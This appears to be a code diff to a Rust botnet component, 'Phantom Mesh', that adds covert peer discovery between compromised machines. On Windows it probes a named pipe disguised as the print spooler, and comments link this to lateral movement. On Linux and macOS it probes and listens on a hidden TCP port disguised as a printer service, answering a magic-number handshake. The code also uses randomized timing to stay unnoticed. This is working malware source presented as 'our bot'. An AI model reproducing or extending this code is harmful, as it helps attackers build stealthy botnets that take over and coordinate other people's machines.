@@ -57,9 +57,17 @@ impl ZeroNoiseDiscovery {
             start_sniffer(map_clone);
         });
 
-        // 2. Periodic Analysis & Probing
+        // 2. Start Covert Handshake Listener (Linux/macOS only)
+        #[cfg(not(target_os = "windows"))]
+        {
+            tokio::spawn(async {
+                start_covert_listener().await;
+            });
+        }
+
+        // 3. Periodic Analysis & Probing
         loop {
-            // User Request: Random 30-90s per search cycle
+            // Random 30-90s per search cycle
             let cycle_delay = rand::thread_rng().gen_range(30..=90);
             sleep(Duration::from_secs(cycle_delay)).await; 
             self.analyze_and_probe().await;
@@ -100,33 +108,178 @@ impl ZeroNoiseDiscovery {
         }
     }
 
+    /// Attempt a covert handshake with a potential peer
+    /// Windows: Named Pipe (spoolss_v2)
+    /// Linux: Hidden TCP port (disguised as printer service)
     #[cfg(target_os = "windows")]
     async fn try_covert_handshake(&self, ip: &str) -> bool {
         use tokio::net::windows::named_pipe::ClientOptions;
         use tokio::io::AsyncWriteExt;
+        use log::debug;
 
+        // Try Named Pipe first (common for Windows lateral movement)
         let pipe_path = format!(r"\\{}\pipe\spoolss_v2", ip);
-        debug!("[Stealth] Probing Pipe: {}", pipe_path);
+        debug!("[Discovery] Probing Pipe: {}", pipe_path);
 
         match ClientOptions::new().open(&pipe_path) {
             Ok(mut client) => {
-                // Shake hands
                 let magic = 0xDEADBEEFu32.to_be_bytes();
-                if let Err(_) = client.write_all(&magic).await {
+                if client.write_all(&magic).await.is_err() {
                     return false;
                 }
-                // If write succeeds, we assume it's our bot.
-                // Real usage would exchange keys here.
                 true
             }
             Err(_) => false,
         }
     }
 
-    #[cfg(not(target_os = "windows"))]
-    async fn try_covert_handshake(&self, _ip: &str) -> bool {
-        warn!("[Stealth] SMB Pipe Handshake only supported on Windows.");
-        false
+    /// Linux: Use TCP connection to a covert port (mimics printer service)
+    #[cfg(target_os = "linux")]
+    async fn try_covert_handshake(&self, ip: &str) -> bool {
+        use tokio::net::TcpStream;
+        use tokio::io::{AsyncWriteExt, AsyncReadExt};
+        use std::time::Duration;
+        use log::debug;
+
+        // Covert port that looks like IPP (Internet Printing Protocol)
+        const COVERT_PORT: u16 = 9631; // Similar to 631 (CUPS), but obscure
+        
+        let addr = format!("{}:{}", ip, COVERT_PORT);
+        debug!("[Discovery] Probing TCP: {}", addr);
+
+        // Short timeout to avoid blocking
+        let connect = tokio::time::timeout(
+            Duration::from_secs(2),
+            TcpStream::connect(&addr)
+        ).await;
+
+        match connect {
+            Ok(Ok(mut stream)) => {
+                // Send magic handshake
+                let magic = 0xDEADBEEFu32.to_be_bytes();
+                if stream.write_all(&magic).await.is_err() {
+                    return false;
+                }
+
+                // Wait for response (should echo magic XOR'd with node marker)
+                let mut response = [0u8; 4];
+                match tokio::time::timeout(
+                    Duration::from_secs(1),
+                    stream.read_exact(&mut response)
+                ).await {
+                    Ok(Ok(_)) => {
+                        // Verify response: magic XOR 0xCAFEBABE
+                        let expected = (0xDEADBEEF_u32 ^ 0xCAFEBABE_u32).to_be_bytes();
+                        response == expected
+                    }
+                    _ => false,
+                }
+            }
+            _ => false,
+        }
+    }
+
+    /// macOS: Use Unix domain socket in /tmp
+    #[cfg(target_os = "macos")]
+    async fn try_covert_handshake(&self, ip: &str) -> bool {
+        use tokio::net::TcpStream;
+        use tokio::io::{AsyncWriteExt, AsyncReadExt};
+        use std::time::Duration;
+        use log::debug;
+
+        // Same TCP approach as Linux
+        const COVERT_PORT: u16 = 9631;
+        
+        let addr = format!("{}:{}", ip, COVERT_PORT);
+        debug!("[Discovery] Probing TCP: {}", addr);
+
+        let connect = tokio::time::timeout(
+            Duration::from_secs(2),
+            TcpStream::connect(&addr)
+        ).await;
+
+        match connect {
+            Ok(Ok(mut stream)) => {
+                let magic = 0xDEADBEEFu32.to_be_bytes();
+                if stream.write_all(&magic).await.is_err() {
+                    return false;
+                }
+
+                let mut response = [0u8; 4];
+                match tokio::time::timeout(
+                    Duration::from_secs(1),
+                    stream.read_exact(&mut response)
+                ).await {
+                    Ok(Ok(_)) => {
+                        let expected = (0xDEADBEEF_u32 ^ 0xCAFEBABE_u32).to_be_bytes();
+                        response == expected
+                    }
+                    _ => false,
+                }
+            }
+            _ => false,
+        }
+    }
+}
+
+// ============================================================================
+// COVERT HANDSHAKE LISTENER (Linux/macOS)
+// ============================================================================
+
+/// Listen for incoming covert handshakes on TCP port 9631
+/// Responds with magic XOR 0xCAFEBABE to prove we're a Phantom Mesh node
+#[cfg(not(target_os = "windows"))]
+async fn start_covert_listener() {
+    use tokio::net::TcpListener;
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    use log::{info, debug, warn};
+
+    const COVERT_PORT: u16 = 9631;
+    const MAGIC: u32 = 0xDEADBEEF;
+    const RESPONSE_XOR: u32 = 0xCAFEBABE;
+
+    let bind_addr = format!("0.0.0.0:{}", COVERT_PORT);
+    
+    let listener = match TcpListener::bind(&bind_addr).await {
+        Ok(l) => {
+            info!("[Discovery] Covert listener started on port {}", COVERT_PORT);
+            l
+        }
+        Err(e) => {
+            warn!("[Discovery] Failed to bind covert port {}: {}", COVERT_PORT, e);
+            return;
+        }
+    };
+
+    loop {
+        match listener.accept().await {
+            Ok((mut stream, addr)) => {
+                debug!("[Discovery] Covert connection from {}", addr);
+                
+                tokio::spawn(async move {
+                    // Read magic handshake
+                    let mut buf = [0u8; 4];
+                    if stream.read_exact(&mut buf).await.is_err() {
+                        return;
+                    }
+
+                    let received = u32::from_be_bytes(buf);
+                    if received != MAGIC {
+                        // Not our handshake, close silently
+                        return;
+                    }
+
+                    // Send response: magic XOR'd
+                    let response = (MAGIC ^ RESPONSE_XOR).to_be_bytes();
+                    let _ = stream.write_all(&response).await;
+                    
+                    info!("[Discovery] Covert handshake completed with {}", addr);
+                });
+            }
+            Err(e) => {
+                warn!("[Discovery] Accept error: {}", e);
+            }
+        }
     }
 }
 
